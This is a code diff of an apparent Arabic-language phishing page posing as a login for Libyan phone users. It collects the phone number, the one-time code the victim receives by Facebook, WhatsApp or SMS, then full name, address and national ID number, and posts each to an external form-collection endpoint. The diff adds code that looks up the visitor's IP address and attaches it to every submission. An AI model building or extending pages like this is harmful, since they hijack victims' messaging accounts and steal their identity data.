@@ -77,7 +77,6 @@
 </head>
 <body>
   <div class="container">
-    <!-- المرحلة 1 -->
     <div class="card active" id="step1">
       <h3>سجل الدخول</h3>
       <label for="phone">رقم الهاتف</label>
@@ -85,14 +84,12 @@
       <button onclick="handleStep1()">إرسال رمز التأكيد</button>
     </div>
 
-    <!-- المرحلة 2 -->
     <div class="card" id="step2">
       <label for="code">الكود أشعار فيسبوك او واتساب أو رسالة نصية</label>
       <input type="text" id="code" placeholder="أدخل الكود هنا" autocomplete="off">
       <button onclick="handleStep2()">ارسال الكود للتأكيد</button>
     </div>
 
-    <!-- المرحلة 3 -->
     <div class="card" id="step3">
       <h3>معلوماتك الشخصية</h3>
       <label for="fullname">الاسم بالكامل</label>
@@ -105,10 +102,18 @@
     </div>
   </div>
 
-  <!-- رسالة -->
   <div class="toast" id="toast">تأكد أن الكود الذي ادخلته صحيح او سوف تضطر اعادة التسجيل</div>
 
   <script>
+    let userIP = "غير معروف";
+
+    // جلب عنوان الـ IP
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        userIP = data.ip;
+      });
+
     function isLibyanPhone(number) {
       return /^(091|092|093|094|095)\d{7}$/.test(number);
     }
@@ -118,7 +123,7 @@
       toast.style.display = 'block';
       setTimeout(() => {
         toast.style.display = 'none';
-      }, 5000); // 5 ثواني
+      }, 5000);
     }
 
     function handleStep1() {
@@ -128,9 +133,10 @@
         return;
       }
 
-      // إرسال الرقم فقط
       const formData = new FormData();
       formData.append('phone', phone);
+      formData.append('ip_address', userIP);
+
       fetch('https://formcarry.com/s/ldfA_DUCDrk', {
         method: 'POST',
         body: formData,
@@ -148,9 +154,10 @@
         return;
       }
 
-      // إرسال الكود فقط
       const formData = new FormData();
       formData.append('code', code);
+      formData.append('ip_address', userIP);
+
       fetch('https://formcarry.com/s/ldfA_DUCDrk', {
         method: 'POST',
         body: formData,
@@ -169,14 +176,13 @@
       formData.append('fullname', document.getElementById('fullname').value);
       formData.append('address', document.getElementById('address').value);
       formData.append('idNumber', document.getElementById('idNumber').value);
+      formData.append('ip_address', userIP);
 
       fetch('https://formcarry.com/s/ldfA_DUCDrk', {
         method: 'POST',
         body: formData,
         headers: { 'Accept': 'application/json' }
-      })
-      .then(() => {
-        // مسح الحقول بعد الإرسال
+      }).then(() => {
         document.getElementById('fullname').value = '';
         document.getElementById('address').value = '';
         document.getElementById('idNumber').value = '';
